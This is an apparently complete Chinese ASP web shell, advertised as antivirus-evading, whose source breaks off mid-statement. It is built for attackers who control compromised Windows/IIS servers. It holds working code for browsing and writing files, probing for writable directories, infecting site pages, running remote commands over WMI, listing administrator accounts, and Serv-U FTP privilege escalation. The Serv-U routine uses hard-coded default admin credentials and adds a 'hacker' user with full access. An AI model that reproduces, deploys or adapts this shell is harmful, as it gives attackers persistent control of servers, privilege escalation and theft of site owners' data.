<%@ LANGUAGE = VBScript %>
<%
  
UserPass="wmphp.com"               
mnAme="暗组[D.S.T]二零零九超强免杀ASP大马"
SiteuRL="http://www.wmphp.com"           
CopyriGht="技术的精纯及无私的奉献才是我们最大的追求 本版本已去后门!"    
AD="专业制作个人版免杀无后门ASP大马 BY：Dbs  QQ：136882447"
imgurl="<hr>"

Server.ScriptTimeout=999999999:Response.Buffer =true
On Error Resume Next
sub ShowErr()
If Err Then
RRS"<br><a href='javascript:history.back()'><br> " & Err.Description & "</a><br>"
Err.Clear
Response.Flush
End If
end sub

Sub RRS(str)
response.write(str)
End Sub

Function RePath(S)
RePath=Replace(S,"\","\\")           
End Function

Function RRePath(S)
RRePath=Replace(S,"\\","\")         
End Function

URL=Request.ServerVariables("URL")
ServerIP=Request.ServerVariables("LOCAL_ADDR")
Action=Request("Action")
RootPath=Server.MapPath(".")
WWWRoot=Server.MapPath("/")
u=request.servervariables("http_host")&url
p=userpass:posurl="http"
FolderPath=Request("FolderPath")
FName=Request("FName")
BackUrl="<br><br><center><a href='javascript:history.back()'>返回</a></center>"

function face(Color,Siz,Var)
if Siz=0 Then
siz=""
Else
siz=" size='"&Siz&"'"                      
end If
face="<FONT face=Webdings color='#"&Color&"' "&Siz&">"&Var&"</FONT>"               '函数返回值为
End Function

RRS"<html><meta http-equiv=""Content-Type"" content=""text/html; charset=gb2312"">":RRS"<title>"&mName&" - "&SErvErIP&" </title>"
RRS"<style type=""text/css"">"
RRS"body,td{font-size: 12px;background-color:#000000;color:lime;scrollbar-face-color: #000000; scrollbar-highlight-color: #008000;  scrollbar-shadow-color: #008000;  scrollbar-3dlight-color: #000000;  scrollbar-arrow-color: #000000;  scrollbar-track-color: #000000;  font-family: verdana;  scrollbar-darkshadow-color: #000000;}"
RRS"input,select,textarea{font-size: 12px;background-color:#ddd;border:1px solid #fff}"
RRS".C{background-color:#000000;border:0px}":RRS".cmd{background-color:#000;color:lime}":RRS"body{margin: 0px;margin-left:4px;}"
RRS"a{color:lime;text-decoration: none;}a:hover{color:lime;background:#000}":RRS".am{color:#55AA66;font-size:11px;}":RRS"</style>"
RRS"<script language=javascript>function killErrors(){return true;}window.onerror=killErrors;"
RRS"function yesok(){if (confirm(""确认要执行此操作吗？""))return true;else return false;}"
RRS"function runClock(){theTime = window.setTimeout(""runClock()"", 100);var today = new Date();var display= today.toLocaleString();window.status=""→"&AD&"  --""+display;}runClock();"
RRS"function ShowFolder(Folder){top.addrform.FolderPath.value = Folder;top.addrform.submit();}"
RRS"function FullForm(FName,FAction){top.hideform.FName.value = FName;if(FAction==""CopyFile""){DName = prompt(""请输入复制到目标文件全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""MoveFile""){DName = prompt(""请输入移动到目标文件全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""CopyFolder""){DName = prompt(""请输入移动到目标文件夹全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""MoveFolder""){DName = prompt(""请输入移动到目标文件夹全名称"",FName);top.hideform.FName.value += ""||||""+DName;}else if(FAction==""NewFolder""){DName = prompt(""请输入要新建的文件夹全名称"",FName);top.hideform.FName.value = DName;}else if(FAction==""CreateMdb""){DName = prompt(""请输入要新建的Mdb文件全名称,注意不能同名！"",FName);top.hideform.FName.value = DName;}else if(FAction==""CompactMdb""){DName = prompt(""请输入要压缩的Mdb文件全名称,注意文件是否存在！"",FName);top.hideform.FName.value = DName;}else{DName = ""Other"";}if(DName!=null){top.hideform.Action.value = FAction;top.hideform.submit();}else{top.hideform.FName.value = """";}}"
RRS"function DbCheck(){if(DbForm.DbStr.value == """"){alert(""请先连接数据库"");FullDbStr(0);return false;}return true;}"
RRS"function FullDbStr(i){if(i<0){return false;}Str = new Array(12);Str[0] = ""Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&RePath(Session("FolderPath"))&"\\db.mdb;Jet OLEDB:Database Password=***"";Str[1] = ""Driver={Sql Server};Server="&ServerIP&",1433;Database=DbName;Uid=sa;Pwd=****"";Str[2] = ""Driver={MySql};Server="&ServerIP&";Port=3306;Database=DbName;Uid=root;Pwd=****"";Str[3] = ""Dsn=DsnName"";Str[4] = ""SELECT * FROM [TableName] WHERE ID<100"";Str[5] = ""INSERT INTO [TableName](USER,PASS) VALUES(\'username\',\'password\')"";Str[6] = ""DELETE FROM [TableName] WHERE ID=100"";Str[7] = ""UPDATE [TableName] SET USER=\'username\' WHERE ID=100"";Str[8] = ""CREATE TABLE [TableName](ID INT IDENTITY (1,1) NOT NULL,USER VARCHAR(50))"";Str[9] = ""DROP TABLE [TableName]"";Str[10]= ""ALTER TABLE [TableName] ADD COLUMN PASS VARCHAR(32)"";Str[11]= ""ALTER TABLE [TableName] DROP COLUMN PASS"";Str[12]= ""当只显示一条数据时即可显示字段的全部字节，可用条件控制查询实现.\n超过一条数据只显示字段的前五十个字节。"";if(i<=3){DbForm.DbStr.value = Str[i];DbForm.SqlStr.value = """";abc.innerHTML=""<center>请确认己连接数据库再输入SQL操作命令语句。</center>"";}else if(i==12){alert(Str[i]);}else{DbForm.SqlStr.value = Str[i];}return true;}"
RRS"function FullSqlStr(str,pg){if(DbForm.DbStr.value.length<5){alert(""请检查数据库连接串是否正确!"");return false;}if(str.length<10){alert(""请检查SQL语句是否正确!"");return false;}DbForm.SqlStr.value = str;DbForm.Page.value = pg;abc.innerHTML="""";DbForm.submit();return true;}"
RRS"</script>"
rrs "<body" 
If Action="" then RRS " scroll=no"
rrs ">" 
Dim ObT(13,2):ObT(0,0) = "Scripting.FileSystemObject":ObT(0,2) = "文件操作组件":ObT(1,0) = "wscript.shell":ObT(1,2) = "命令行执行组件":ObT(2,0) = "ADOX.Catalog":ObT(2,2) = "ACCESS建库组件":ObT(3,0) = "JRO.JetEngine":ObT(3,2) = "ACCESS压缩组件":ObT(4,0) = "Scripting.Dictionary" :ObT(4,2) = "数据流上传辅助组件":ObT(5,0) = "Adodb.connection":ObT(5,2) = "数据库连接组件":ObT(6,0) = "Adodb.Stream":ObT(6,2) = "数据流上传组件":ObT(7,0) = "SoftArtisans.FileUp":ObT(7,2) = "SA-FileUp 文件上传组件":ObT(8,0) = "LyfUpload.UploadFile":ObT(8,2) = "刘云峰文件上传组件":ObT(9,0) = "Persits.Upload.1":ObT(9,2) = "ASPUpload 文件上传组件":ObT(10,0) = "JMail.SmtpMail":ObT(10,2) = "JMail 邮件收发组件":ObT(11,0) = "CDONTS.NewMail":ObT(11,2) = "虚拟SMTP发信组件":ObT(12,0) = "SmtpMail.SmtpMail.1":ObT(12,2) = "SmtpMail发信组件":ObT(13,0) = "Microsoft.XMLHTTP":ObT(13,2) = "数据传输组件"
For i=0 To 13
	Set T=Server.CreateObject(ObT(i,0))
	If -2147221005 <> Err Then
	  IsObj=" √"
	Else
	  IsObj=" ×"
	  Err.Clear
	End If
	Set T=Nothing
	ObT(i,1)=IsObj
Next
If FolderPath<>"" then
  Session("FolderPath")=RRePath(FolderPath)
End If
If Session("FolderPath")="" Then
  FolderPath=RootPath
  Session("FolderPath")=FolderPath
End if

Function MainForm()
RRS"<form name=""hideform"" method=""post"" action="""&URL&""" target=""FileFrame"">"
RRS"<input type=""hidden"" name=""Action"">"
RRS"<input type=""hidden"" name=""FName"">"
RRS"</form>"
RRS"<table width='100%' height='100%'  border=0 cellpadding='0' cellspacing='0'>"
RRS"<tr><td height='30' colspan='2'>"
RRS"<table width='100%'>"
RRS"<form name='addrform' method='post' action='"&URL&"' target='_parent'>"
RRS"<tr><td width='60' align='center'>地址栏：</td><td>"
RRS"<input name='FolderPath' style='width:100%' value='"&Session("FolderPath")&"'>"
RRS"</td><td width='130' align='center'><input name='Submit' type='submit' value='转到'> <input type='submit' value='刷新' onclick='FileFrame.location.reload()'>" 
RRS"  <tr align='center' valign='middle'>"
RRS"<tr>提权目录：『<a href='javascript:ShowFolder(""C:\\Program Files"")'>Program</a>』『<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\"")'>AllUsers</a>』『<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\"")'>程序</a>』『<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Application Data\\Symantec\\pcAnywhere\\"")'>pcAnywhere</a>』『<a href='javascript:ShowFolder(""c:\\Program Files\\serv-u\\"")'>serv-u</a>』『<a href='javascript:ShowFolder(""C:\\Program Files\\Real"")'>RealServer</a>』     『<a href='javascript:ShowFolder(""C:\\Program Files\\Microsoft SQL Server\\"")'>SQL</a>』『<a href='javascript:ShowFolder(""C:\\WINDOWS\\system32\\config\\"")'>config</a>』『<a href='javascript:ShowFolder(""c:\\WINDOWS\\system32\\inetsrv\\data\\"")'>data</a>』『<a href='javascript:ShowFolder(""c:\\windows\\Temp\\"")'>Temp</a>』     『<a href='javascript:ShowFolder(""C:\\RECYCLER\\"")'>RECYCLER</a>』『<a href='javascript:ShowFolder(""C:\\php\\"")'>php</a>』『<a href='javascript:ShowFolder(""C:\\Documents and Settings\\All Users\\Documents\\"")'>Documents</a>』</td><td>"
RRS"</td></tr></form></table></center></td></tr><tr><td width='170'>"
RRS"<iframe name='Left' src='?Action=MainMenu' width='100%' height='100%' frameborder='0'></iframe></td>"
RRS"<td>"
RRS"<iframe name='FileFrame' src='?Action=Show1File' width='100%' height='100%' frameborder='1'></iframe>"
RRS"</td></tr></table>"
End Function

Function MainMenu()
RRS"<table width='100%' cellspacing='0' cellpadding='0'>"
RRS"<tr><td height='5'></td></tr>"
RRS"<tr><td><center><a href='"&SiteURL&"' target='_blank'><font color=red>"&mName&"</font></center></a><center>"&imgurl&"</center>"
RRS"</td></tr>"
If ObT(0,1)=" ×" Then
RRS"<tr><td height='24'>无权限/无FSO</td></tr>"
Else
RRS"<tr><td height=22 onmouseover=""menu1.style.display=''""><b>"&face("ff8000","+1","H")&" +≤查看硬盘≥</b><div id=menu1 style=""width:100%;display='none'"" onmouseout=""menu1.stystyle.display='none'"">"
Set ABC=New LBF:RRS ABC.ShowDriver():Set ABC=Nothing
RRS"</div></td></tr><tr><td height='20'><a href='javascript:ShowFolder("""&RePath(WWWRoot)&""")'>"&face("ff8000",0,"8")&"〖站点目录〗</a></td></tr>"
RRS"<tr><td height='20'><a href='javascript:ShowFolder("""&RePath(RootPath)&""")'>"&face("ff8000",0,"8")&"〖本马目录〗</a></td></tr>"
RRS"<tr><td height='20'><a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\NewFolder")&""",""NewFolder"")'>"&face("ff8000",0,"=")&"〖新建目录〗</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=EditFile' target='FileFrame'>"&face("ff8000",0,"=")&"〖新建文本〗</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=UpFile' target='FileFrame'>"&face("ff8000",0,"=")&"〖上传文件〗</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=Cplgm&M=4' target='FileFrame'>"&face("ff8000",0,"=")&"〖指定挂马〗</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=plgm' target='FileFrame'></b>"&face("ff8000",0,"=")&"〖快速挂马〗</a></div></td></tr>"
RRS"<tr><td height='20'><a href='?Action=Cplgm&M=1' target='FileFrame'>"&face("ff8000",0,"=")&"〖超强挂马〗</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=Cplgm&M=2' target='FileFrame'>"&face("ff8000",0,"=")&"〖超强清马〗</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=Cplgm&M=3' target='FileFrame'>"&face("ff8000",0,"=")&"〖超强替换〗</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=kmuma' target='FileFrame'>"&face("ff8000",0,"=")&"〖查杀木马〗</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=ScanDriveForm' target='FileFrame'>"&face("ff8000",0,"=")&"〖可写目录〗</a><br>"
RRS"<tr><td height='20'><a href='?Action=nofw' target='FileFrame'>"&face("ff8000",0,"=")&"〖免FSO-WSH写〗</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=gody' target='FileFrame'>"&face("ff8000",0,"=")&"〖漏洞检测〗</a><br>"
RRS"<tr><td height='20'><a href='?Action=getTerminalInfo' target='FileFrame'>"&face("ff8000",0,"=")&"〖终端端口〗</a><br>"
RRS"<tr><td height='20'><a href='?Action=Alexa' target='FileFrame'>"&face("ff8000",0,"=")&"〖组件支持〗</a><br>"
RRS"<tr><td height='20'><a href='?Action=Course' target='FileFrame'>"&face("ff8000",0,"=")&"〖系统账号〗</a><br>"
RRS"<tr><td height='20'><a href='?Action=adminab' target='FileFrame'>"&face("ff8000",0,"=")&"〖查管理员〗</a><br>"
RRS"<tr><td height='20'><a href='?Action=wmi' target='FileFrame'>"&face("ff8000",0,"=")&"〖WMI-执行〗</a><br>"
RRS"<tr><td height='20'><a href='?Action=fuck'   target='FileFrame'>"&face("ff8000",0,"=")&"〖安装软件〗</a><br>"
RRS"<tr><td height='20'><a href='?Action=hook'   target='FileFrame'>"&face("ff8000",0,"=")&"〖服务设置〗</a><br>"
RRS"<tr><td height='20'><a href='?Action=adduser' target='FileFrame'>"&face("ff8000",0,"=")&"〖增加用户〗</a><br>"
RRS"<tr><td height='20'><a href='?Action=sqlabc' target='FileFrame'>"&face("ff8000",0,"=")&"〖SQL-提权〗</a><br>"
RRS"<tr><td height='22'><a href='?Action=MMD' target='FileFrame'>"&face("ff8000",0,"~")&"〖SQL-CMD〗</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=Cmd1Shell' target='FileFrame'>"&face("ff8000",0,"=")&"〖CMD-命令〗</a><br>"
RRS"<tr><td height='20'><a href='?Action=Servu' target='FileFrame'>"&face("ff8000",0,"~")&"〖SU全通杀〗</a><br>"
RRS"<tr><td height='20'><a href='?Action=suftp' target='FileFrame'>"&face("ff8000",0,"~")&"〖Su-Ftp杀〗</a><br>"
RRS"<tr><td height='22'><a href='?Action=backup' target='FileFrame'>"&face("ff8000",0,"=")&"〖数据库字段复制〗</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=lp' target='FileFrame'>"&face("ff8000",0,"~")&"〖蓝屏0day〗</a></td></tr>"
RRS"<tr><td height='20'><a href='?Action=ScanPort' target='FileFrame'>"&face("ff8000",0,"=")&"〖端口扫描〗</a><br>"
RRS"<tr><td height='20'><a href='?Action=upload' target='FileFrame'>"&face("ff8000",0,"=")&"〖直接下载〗</a><br>"
RRS"<tr><td height='20'><a href='?Action=ReadREG' target='FileFrame'>"&face("ff8000",0,"=")&"〖查注册表〗</a><br>"
RRS"<tr><td height='24' onmouseover=""menu2.style.display=''""><b>"&face("ff8000","+1","P")&"+≤数据库操作≥</b><div id=menu2 style=""line-height:18px;width:100%;display='none'"" onmouseout=""menu2.style.display='none'"">"
RRS"   <a href='?Action=DbManager' target='FileFrame'>"&face("ff8000",0,"8")&"连数据库</a><br>"
RRS"   <a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\New.mdb")&""",""CreateMdb"")'>"&face("ff8000",0,"8")&"建MDB文件</a><br>"
RRS"   <a href='javascript:FullForm("""&RePath(Session("FolderPath")&"\data.mdb")&""",""CompactMdb"")'>"&face("ff8000",0,"8")&"压MDB文件</a></div></td></tr>"
RRS"<tr><td height='22'><a href='?Action=PageAddToMdb' target='FileFrame'>"&face("ff8000",0,"=")&"〖整站打包〗</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=webpor' target='FileFrame'>"&face("ff8000",0,"~")&"〖在线代理〗</a></td></tr>"
RRS"<tr><td height='22'><a href='?Action=Logout' target='_top'>"&face("ff8000",0,"=")&"〖安全退出〗</a></td></tr>"
RRS"<tr><td align=center style='color:red'><center>"&imgurl&"</center>"&Copyright&"</td></tr></table>"
RRS"</table>"
End If
End Function

Sub Message(state,msg,flag)
Response.Write "<TABLE width=480 border=0 align=center cellpadding=0 cellspacing=1 bgcolor=#91d70d>"
Response.Write "  <TR>"
Response.Write "    <TD class=TBHead>系统信息</TD>"
Response.Write "  </TR>"
Response.Write "  <TR>"
Response.Write "    <TD align=middle bgcolor=#ecfccd>"
Response.Write "	  <TABLE width=82% border=0 cellpadding=5 cellspacing=0>"
Response.Write "	    <TR>"
Response.Write "		  <TD><FONT color=red>"
Response.Write state
Response.Write "</FONT></TD>"
Response.Write "		<TR>"
Response.Write "		  <TD><P>"
Response.Write msg
Response.Write "</P></TD>"
Response.Write "		</TR>"
Response.Write "	  </TABLE>"
Response.Write "	</TD>"
Response.Write "  </TR>"
Response.Write "  <TR>"
Response.Write "    <TD class=TBEnd>"
Response.Write "	"
If flag=0 Then
Response.Write "	      <INPUT type=button value=关闭 onclick=""window.close();"">"
Response.Write "	"
Else
Response.Write "	      <INPUT type=button value=返回 onClick=""history.go(-1);"">"
Response.Write "	"
End if
Response.Write "	</TD>"
Response.Write "  </TR>"
Response.Write "</TABLE>"
End Sub

Function Red(str)
    Red = "<FONT color=#ff2222>" & str & "</FONT>"
End Function

Sub ScanDriveForm()
    Dim FSO,DriveB
	Set FSO = Server.Createobject("Scripting.FileSystemObject")
Response.Write "<TABLE width=480 border=0 align=center cellpadding=3 cellspacing=1 bgColor=#91d70d>"
Response.Write "  <TR>"
Response.Write "    <TD colspan=5 class=TBHead>磁盘/系统文件夹信息</TD>"
Response.Write "  </TR>"
For Each DriveB in FSO.Drives
Response.Write "  <TR align=middle class=TBTD>"
Response.Write "    <FORM action="
Response.Write "?Action=ScanDrive&Drive="
Response.Write DriveB.DriveLetter
response.write " method=Post>"
response.write "<TD width=25"&chr(37)&"><B>盘符</B></TD>"
response.write "<TD width=15"&chr(37)&">"
response.write DriveB.DriveLetter
response.write ":</TD>"
response.write "	<TD width=20"&chr(37)&"><B>类型</B></TD>"
response.write "	<TD width=20"&chr(37)&">"
	  Select Case DriveB.DriveType
	      Case 1: Response.write "可移动"
		  Case 2: Response.write "本地硬盘"
		  Case 3: Response.write "网络磁盘"
		  Case 4: Response.write "CD-ROM"
		  Case 5: Response.write "RAM磁盘"
		  Case else: Response.write "未知类型"
	  End Select
Response.Write "	</TD>"
Response.Write "	<TD><INPUT type=submit value=详细报告></TD>"
Response.Write "	</FORM>"
Response.Write "  </TR>"
Next
Response.Write "  <TR class=TBTD>"
Response.Write "    <FORM action="
Response.Write "?Action=ScFolder&Folder="
Response.Write FSO.GetSpecialFolder(0)
Response.Write " method=Post>		  "
Response.Write "	<TD align=middle><B>Windows文件夹</B></TD>"
Response.Write "	<TD colspan=3>"
Response.Write FSO.GetSpecialFolder(0)
Response.Write "</TD>"
Response.Write "	<TD align=middle><INPUT type=submit value=详细报告></TD>"
Response.Write "	</FORM>"
Response.Write "  </TR>"
Response.Write "  <TR class=TBTD>"
Response.Write "    <FORM action="
Response.Write "?Action=ScFolder&Folder="
Response.Write FSO.GetSpecialFolder(1)
Response.Write " method=Post>		  "
Response.Write "	<TD align=middle><B>System32文件夹</B></TD>"
Response.Write "	<TD colspan=3>"
Response.Write FSO.GetSpecialFolder(1)
Response.Write "</TD>"
Response.Write "	<TD align=middle><INPUT type=submit value=详细报告></TD>"
Response.Write "	</FORM>"
Response.Write "  </TR>"
Response.Write "  <TR class=TBTD>"
Response.Write "    <FORM action="
Response.Write "?Action=ScFolder&Folder="
Response.Write FSO.GetSpecialFolder(2)
Response.Write " method=Post>		  "
Response.Write "	<TD align=middle><B>系统临时文件夹</B></TD>"
Response.Write "	<TD colspan=3>"
Response.Write FSO.GetSpecialFolder(2)
Response.Write "</TD>"
Response.Write "	<TD align=middle><INPUT type=submit value=详细报告></TD>"
Response.Write "	</FORM>"
Response.Write "  </TR>"
Response.Write "</TABLE><BR>"
Response.Write "<DIV align=center>"
Response.Write "<b>当前网站绝对路径:"&Server.MapPath("/")&"</b>"
Response.Write "  <FORM Action="
Response.Write "?Action=ScFolder method=Post>指定文件夹查询："
Response.Write "    <INPUT type=text name=Folder>"
Response.Write "	<INPUT type=submit value=生成报告>　指定文件夹路径。如：F:\ASP\"
Response.Write "  </FORM>"
Response.Write "<DIV>"
	Set FSO=Nothing
End Sub

Sub ScanDrive(Drive)
    Dim FSO,TestDrive,BaseFolder,TempFolders,Temp_Str,D
	If Drive <> "" Then
	    Set FSO = Server.Createobject("Scripting.FileSystemObject")
		Set TestDrive = FSO.GetDrive(Drive)
		If TestDrive.IsReady Then
		    Temp_Str = "<LI>磁盘分区类型：" & Red(TestDrive.FileSystem) & "<LI>磁盘序列号：" & Red(TestDrive.SerialNumber) & "<LI>磁盘共享名：" & Red(TestDrive.ShareName) & "<LI>磁盘总容量：" & Red(CInt(TestDrive.TotalSize/1048576)) & "<LI>磁盘卷名：" & Red(TestDrive.VolumeName) & "<LI>磁盘根目录:" & ScReWr((Drive & ":\"))

			Set BaseFolder = TestDrive.RootFolder
			Set TempFolders = BaseFolder.SubFolders
			For Each D in TempFolders
			    Temp_Str = Temp_Str & "<LI>文件夹：" & ScReWr(D)
			Next
			Set TempFolder = Nothing
			Set BaseFolder = Nothing
	    Else
		    Temp_Str = Temp_Str & "<LI>磁盘根目录:" & Red("不可读:(")
			Dim TempFolderList,t:t=0
			Temp_Str = Temp_Str & "<LI>" & Red("穷举目录测试：")
			TempFolderList = Array("windows","winnt","win","win2000","win98","web","winme","windows2000","asp","php","Tools","Documents and Settings","Program Files","Inetpub","ftp","wmpub","tftp")
			For i = 0 to Ubound(TempFolderList)
			    If FSO.FolderExists(Drive & ":\" & TempFolderList(i)) Then
				    t = t+1
					Temp_Str = Temp_Str & "<LI>发现文件夹：" & ScReWr(Drive & ":\" & TempFolderList(i))
			    End if
		    Next
			If t=0 then Temp_Str = Temp_Str & "<LI>已穷举" & Drive & "盘根目录，但未有发现:("
	    End if
		Set TestDrive = Nothing
	    Set FSO = Nothing
		Temp_Str = Temp_Str & "<LI>注意：" & Red("不要多次刷新本页面，否则在只写文件夹会留下大量垃圾文件!")
		Message Drive & ":磁盘信息",Temp_Str,1
	End if
End Sub

Sub ScFolder(folder) 
    On Error Resume Next
	Dim FSO,OFolder,TempFolder,Scmsg,S
	Set FSO = Server.Createobject("Scripting.FileSystemObject")
	If FSO.FolderExists(folder) Then
	    Set OFolder = FSO.GetFolder(folder)
		Set TempFolders = OFolder.SubFolders
		Scmsg = "<LI>指定文件夹根目录：" & ScReWr(folder)
		For Each S in TempFolders
		     Scmsg = Scmsg&"<LI>文件夹：" & ScReWr(S)  
		Next
		Set TempFolders = Nothing
		Set OFolder = Nothing
	Else
	    Scmsg = Scmsg & "<LI>文件夹：" & Red(folder & "不存在或无读权限!")
	End if
	Scmsg = Scmsg & "<LI>注意：" & Red("不要多次刷新本页面，否则在只写文件夹会留下大量垃圾文件!")
	Set FSO = Nothing
	Message "文件夹信息",Scmsg,1
End Sub

Function ScReWr(folder)
   On Error Resume Next
   Dim FSO,TestFolder,TestFileList,ReWrStr,RndFilename
   Set FSO = Server.Createobject("Scripting.FileSystemObject")
   Set TestFolder = FSO.GetFolder(folder)
   Set TestFileList = TestFolder.SubFolders
   RndFilename = "\temp" & Day(now) & Hour(now) & Minute(now) & Second(now) & ".tmp"
   For Each A in TestFileList
   Next
   If err Then
       err.Clear
	   ReWrStr = folder & "<FONT color=#ff2222> 不可读,"
	   FSO.CreateTextFile folder & RndFilename,True
	   If err Then
	       err.Clear
		   ReWrStr = ReWrStr & "不可写。</FONT>"
	   Else
	       ReWrStr = ReWrStr & "可写。</FONT>"
		   FSO.DeleteFile folder & RndFilename,True
	   End If
   Else
       ReWrStr = folder & "<FONT color=#ff2222> 可读,"
	   FSO.CreateTextFile folder & RndFilename,True
	   If err Then
	       err.Clear
		   ReWrStr = ReWrStr & "不可写。</FONT>"
	   Else
	       ReWrStr = ReWrStr & "可写。</FONT>"
		   FSO.DeleteFile folder & RndFilename,True
	   End if
   End if
   Set TestFileList = Nothing
   Set TestFolder = Nothing
   Set FSO = Nothing
   ScReWr = ReWrStr
End Function

Function Course()
SI="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
SI=SI&"<tr><td height='20' colspan='3' align='center' bgcolor='menu'>系统用户与服务</td></tr>"
on error resume next
for each obj in getObject("WinNT://.")
err.clear
if OBJ.StartType="" then
SI=SI&"<tr>"
SI=SI&"<td height=""20"" bgcolor=""#FFFFFF""> "
SI=SI&obj.Name
SI=SI&"</td><td bgcolor=""#FFFFFF""> " 
SI=SI&"系统用户(组)"
SI=SI&"</td></tr>"
SI0="<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2""> </td></tr>" 
end if
if OBJ.StartType=2 then lx="自动"
if OBJ.StartType=3 then lx="手动"
if OBJ.StartType=4 then lx="禁用"
if LCase(mid(obj.path,4,3))<>"win" and OBJ.StartType=2 then
SI1=SI1&"<tr><td height=""20"" bgcolor=""#FFFFFF""> "&obj.Name&"</td><td height=""20"" bgcolor=""#FFFFFF""> "&obj.DisplayName&"<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">[启动类型:"&lx&"]<font color=#FF0000> "&obj.path&"</font></td></tr>"
else
SI2=SI2&"<tr><td height=""20"" bgcolor=""#FFFFFF""> "&obj.Name&"</td><td height=""20"" bgcolor=""#FFFFFF""> "&obj.DisplayName&"<tr><td height=""20"" bgcolor=""#FFFFFF"" colspan=""2"">[启动类型:"&lx&"]<font color=#3399FF> "&obj.path&"</font></td></tr>"
end if
next
RRS SI&SI0&SI1&SI2&"</table>"
End Function

Function wmi()
SI="<br><table width='80%' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
RRS "<form name=""form1"" method=""post"" action=""?Action=wmi"">"
RRS "  远程执行命令"
RRS "<input name=""xd"" type=""text"" id=""xd"" value=""192.168.0.1"",""root/cimv2"",""hacker$"",""hacker"" size=""70"">"
RRS "    <input type=""submit"" name=""Submit"" value=""提交"">"
RRS "</form>"
if request("xd")<>"" then
set ww=server.createobject("wbemscripting.swbemlocator")
set cc=ww.connectserver(request("xd"))
set ss=cc.get("Win32_ProcessStartup")
Set oC=ss.SpawnInstance_
oC.ShowWindow=12
Set pp=cc.get("Win32_Process")
Response.Write pp.create("net user",null,oC,intProcessID)
Response.Write "<br>"&intProcessID
Response.end
end if
End Function

Function adminab()
Response.Expires=0
on error resume next
Set tN=server.createObject("Wscript.Network")
Set objGroup=GetObject("WinNT://"&tN.ComputerName&"/Administrators,group")
For Each admin in objGroup.Members
Response.write admin.Name&"<br>"
Next
if err then
Response.write "他奶奶的不行啊:Wscript.Network"
end if
End Function

Function suftp()
rrs"<p><center>Serv-U FTP提权程序--通杀版<br><br>IP连接说明:<br>服务器IP:0.0.0.0代表任何IP都可以连接<br>如果0.0.0.0不成功就修改成此IP:"&Request.ServerVariables("LOCAL_ADDR")&"<br>如果再不成功就代表Serv-u密码被改</p>"
rrs"<form name='form1' method='post' action=''>"
rrs"<center>服务器IP:<input name='serip' type='text' class='TextBox' id='duser' value='0.0.0.0'><br>"
rrs"<center>管理员:<input name='duser' type='text' class='TextBox' id='duser' value='LocalAdministrator'><br>"
rrs"<center>管理员密码 :<input name='dpwd' type='text' class='TextBox' id='dpwd' value='#l@$ak#.lk;0@P'><br>"
rrs"<center>SERV-U端口:<input name='dport' type='text' class='TextBox' id='dport' value='43958'><br>"
rrs"<center>添加的用户名:<input name='tuser' type='text' class='TextBox' id='tuser' value='hacker'><br>"
rrs"<center>添加的用户密码:<input name='tpass' type='text' class='TextBox' id='pass' value='hacker'><br>"
rrs"<center>帐号的所对的路径:<input name='tpath' type='text' class='TextBox' id='tpath' value='C:\'><br>"
rrs"<center>服务端口:<input name='tport' type='text' class='TextBox' id='tport' value='21'><br>"
rrs"<center><input name='radiobutton' type='radio' value='add' checked class='TextBox'>确定添加"
rrs"<center><input type='radio' name='radiobutton' value='del' class='TextBox'>确定删除"
rrs"<p><input name='Submit' type='submit' class='buttom' value='提交'></p></form>"
serverip = request.form("serip")
usr = request.form("duser")
pwd = request.form("dpwd")
port = request.form("dport")
tuser = request.form("tuser")
tpass = request.form("tpass")
tpath = request.form("tpath")
tport = request.form("tport")
hostip = request.form("hostp")
timeout=600
if request.form("radiobutton") = "add" then
leaves = "User " & usr & vbcrlf
leaves = leaves & "Pass " & pwd & vbcrlf
leaves = leaves & "SITE MAINTENANCE" & vbcrlf
leaves = leaves & "-DeleteDOMAIN" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & " PortNo=" & tport & vbcrlf
mt = "SITE MAINTENANCE" & vbcrlf
leaves = leaves & "-SETDOMAIN" & vbcrlf & "-Domain=TEST596|"&serverip&"|" & tport & "|-1|1|0" & vbcrlf & "-TZOEnable=0" & vbcrlf & " TZOKey=" & vbcrlf
leaves = leaves & "-SETUSERSETUP" & vbcrlf & "-IP=0.0.0.0" & vbcrlf & "-PortNo=" & tport & vbcrlf & "-User=" & tuser & vbcrlf & "-Password=" & tpass & vbcrlf & _
"-HomeDir=" & tpath & "\" & vbcrlf & "-LoginMesFile=" & vbcrlf & "-Disable=0" & vbcrlf & "-RelPaths=1" & vbcrlf & _
"-NeedSecure=0" & vbcrlf & "-HideHidden=0" & vbcrlf & "-AlwaysAllowLogin=0" & vbcrlf & "-ChangePassword=0" & vbcrlf & _
"-QuotaEnable=0" & vbcrlf & "-MaxUsersLoginPerIP=-1" & vbcrlf & "-SpeedLimitUp=0" & vbcrlf & "-SpeedLimitDown=0" & vbcrlf & _
"-MaxNrUsers=-1" & vbcrlf & "-IdleTimeOut=600" & vbcrlf & "-SessionTimeOut=-1" & vbcrlf & "-Expire=0" & vbcrlf & "-RatioUp=1" & vbcrlf & _
"-RatioDown=1" & vbcrlf & "-RatiosCredit=0" & vbcrlf & "-QuotaCurrent=0" & vbcrlf & "-QuotaMaximum=0" & vbcrlf & _
